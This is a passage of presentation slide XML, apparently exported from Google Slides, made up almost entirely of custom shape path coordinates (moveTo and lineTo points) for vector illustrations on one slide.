                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="38" y="5722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="148" y="6052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="441" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1065" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2935" y="13315"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3522" y="15003"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4072" y="16653"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4293" y="17424"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="17827"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4513" y="18047"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="18231"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="18451"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4733" y="18634"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="18781"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="18928"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="19074"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="19221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5503" y="19404"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5833" y="19551"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="19661"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6604" y="19698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7007" y="19698"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7484" y="19625"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="19515"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="19184"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11079" y="18341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="17570"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13830" y="17314"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="17020"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="17020"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14674" y="16947"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="16873"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="16837"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14894" y="16690"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15187" y="16433"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15407" y="16103"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15554" y="15773"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15701" y="15406"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15774" y="15039"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15811" y="14636"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15847" y="13866"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15884" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15884" y="13756"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15847" y="13572"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15811" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15664" y="13059"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15334" y="12178"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14710" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13500" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="3962"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11776" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11446" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="1027"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="917"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11299" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="403"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="110"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345"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295" name="Google Shape;295;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6991200" y="2879025"/>
              <a:ext cx="390675" cy="444800"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="15627" h="17792" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="10528" y="1"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10455" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="221"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="441"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="881"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="2091"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="2201"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="2421"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="2311"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="2018"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10235" y="1981"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="624"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="111"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="37"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="1"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3559" y="1028"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3522" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="1101"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3485" y="1138"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="1321"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="1468"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="1761"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4109" y="2055"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4366" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="2972"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="3082"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="3045"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="2862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="2642"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="2605"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="2495"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="2385"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4806" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="1615"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="1394"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3889" y="1174"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3595" y="1028"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="15334" y="3999"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="15260" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15187" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14967" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14820" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14527" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14490" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14453" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14417" y="4586"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14233" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13720" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13830" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14380" y="5173"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14673" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14783" y="4953"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14857" y="4806"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15260" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15444" y="4696"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15554" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="4366"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15627" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15554" y="4109"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15480" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15407" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15334" y="3999"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2238" y="7447"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2128" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1064" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="477" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="257" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="147" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="74" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="111" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="221" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="367" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="514" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="808" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1028" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2458" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495" y="7594"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2422" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="7447"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="6677" y="7814"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="6603" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6933" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7044" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7777" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="8951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="9061"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="8987"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9464" y="8217"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="8291"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="8657"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="8621"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8254" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8071" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7961" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="8254"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7630" y="8401"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7410" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7264" y="8364"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6787" y="7850"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="7814"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12876" y="11005"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12803" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="11152"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12766" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="11702"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13279" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13499" y="12399"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13646" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13830" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13976" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="12582"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14086" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14160" y="12436"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14160" y="12325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14160" y="12252"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="12142"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14086" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14050" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13903" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13830" y="11885"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="11592"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13059" y="11042"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13023" y="11005"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="8181" y="3192"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="8511" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="3265"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="3339"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="3669"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10528" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="4035"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="4256"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="4476"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="4732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="5576"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="5870"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="6200"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="6530"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12509" y="7484"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="7814"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12399" y="8144"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="8511"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12142" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11996" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="9428"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="9721"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9941" y="11555"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="12032"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="12509"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="13022"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="13279"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="13573"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="14123"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="14013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7704" y="13939"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8584" y="11665"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9061" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="9538"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="9208"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8768" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8217" y="11445"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7337" y="13719"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7227" y="13903"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6970" y="13829"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="13683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="13646"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6493" y="13389"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="13096"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="12546"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="11372"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="10125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6713" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="8804"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6640" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6530" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6420" y="8731"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6383" y="8767"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6347" y="8841"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6237" y="9978"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6200" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="12289"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="12912"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="13536"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5540" y="13353"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5099" y="13206"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4182" y="13132"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4329" y="12876"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="12619"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="12362"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4623" y="12069"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="11482"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4696" y="10895"/>
                  </a:lnTo>
